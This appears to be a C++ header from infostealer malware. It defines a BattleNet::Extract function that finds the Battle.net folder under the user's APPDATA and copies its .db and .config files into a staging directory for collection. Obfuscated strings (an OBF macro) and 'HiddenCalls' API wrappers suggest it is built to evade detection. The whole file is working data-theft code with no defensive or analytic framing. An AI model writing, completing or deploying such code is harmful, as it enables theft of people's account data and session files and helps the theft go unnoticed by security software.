#ifndef BATTLENET_HPP
#define BATTLENET_HPP

#include <string>
#include <filesystem>
#include "Winapi_structs.hpp"

namespace fs = std::filesystem;

namespace BattleNet {
    inline void Extract(const std::string& baseDir) {
        std::string battleNetFolder = std::string(getenv(OBF("APPDATA"))) + "\\" + OBF("Battle.net");
        if (!fs::exists(battleNetFolder)) return;

        std::string targetDir = baseDir + "\\" + OBF("BattleNet");
        HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

        for (const auto& file : fs::directory_iterator(battleNetFolder)) {
            if (!fs::is_directory(file) && (file.path().extension() == OBF(".db") || file.path().extension() == OBF(".config"))) {
                HiddenCalls::CopyFileA(file.path().string().c_str(), (targetDir + "\\" + file.path().filename().string()).c_str(), FALSE);
            }
        }
    }
}

#endif
